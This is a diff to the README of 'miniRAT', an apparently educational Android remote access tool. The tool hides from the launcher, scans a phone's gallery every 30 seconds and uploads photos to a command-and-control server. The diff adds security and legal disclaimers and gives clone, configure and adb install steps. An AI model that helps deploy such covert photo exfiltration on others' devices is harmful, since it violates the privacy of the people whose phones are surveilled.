@@ -16,6 +16,19 @@
 
 </div>
 
+## ⚠️ Server Security Notice
+
+> [!CAUTION]
+> **The C2 server is NOT production-ready.** It is intended for local testing and development only.
+> - No authentication or access control
+> - No HTTPS/TLS (plaintext HTTP)
+> - No rate limiting or input validation
+> - No device identity verification
+> - Potential path traversal vectors
+>
+> **Do NOT expose this server to the public internet.** Use it only in controlled, local network environments.
+
+
 ---
 
 ## ⚡ How It Works
@@ -26,7 +39,7 @@
  App installed → icon vanishes →           node server.js (:5000)
  foreground service starts →               
                                           
- ┌──────── Every 15 min ────────┐         ┌──────────────────────┐
+ ┌──────── Every 30 sec ────────┐         ┌──────────────────────┐
  │                              │         │                      │
  │  1. HEAD → server up?        │────────▶│  ✓ 200 OK           │
  │     no → idle, retry later   │         │                      │
@@ -40,8 +53,8 @@
  │  4. GET /api/requests        │────────▶│  Any full-image      │
  │     any full-image requests? │         │  requests queued?    │
  │                              │         │                      │
- │  5. POST full images         │────────▶│  Save to ./fullsize  │
- │     (for requested ones)     │         │  Download button     │
+ │  5. POST full images         │────────▶│  Save to ./full_res  │
+ │     (parallel thread)        │         │                      │
  └──────────────────────────────┘         └──────────────────────┘
 ```
 
@@ -54,8 +67,8 @@
 <td width="50%">
 
 ### 📱 Android Client
-- **Zero-UI** — Invisible activity, auto-hides from launcher
-- **Periodic scan** — Every 15 min, checks for new photos
+- **Headless mode** — Switches to background-only after first launch
+- **Periodic scan** — Every 30 sec, checks for new photos
 - **Server-aware** — Only uploads when C2 is reachable
 - **Deduplication** — Never re-uploads the same image
 - **Full image on-demand** — Server requests → phone uploads full-res
@@ -90,7 +103,7 @@
 ```bash
 git clone https://github.com/Rhishavhere/miniRAT.git
 cd miniRAT
-echo "DOMAIN_URL=https://your-server.com" > app/local.properties
+echo "SERVER_URL=https://your-server.com" > app/local.properties
 ```
 
 ### 2. Start C2
@@ -122,7 +135,7 @@ adb install app/build/outputs/apk/debug/app-debug.apk
 miniRAT/
 │
 ├── 📱 app/src/main/java/com/app/minirat/
-│   ├── HiddenActivity.java       # Entry: permission → service → hide
+│   ├── HeadlessMode.java         # Entry: permission → service → headless
 │   ├── Service.java              # Lifecycle + scan scheduling
 │   ├── GalleryScanner.java       # MediaStore queries + image processing
 │   ├── NetworkManager.java       # HTTP: ping, upload, request queue
@@ -157,10 +170,12 @@ miniRAT/
 
 ---
 
+
 ## ⚠️ Disclaimer
 
 > **Educational and authorized security research only.**
 > Only install on devices you own or have explicit written authorization to test.
+> Unauthorized use against devices you do not own is **illegal** and may violate computer fraud laws.
 
 ---
 
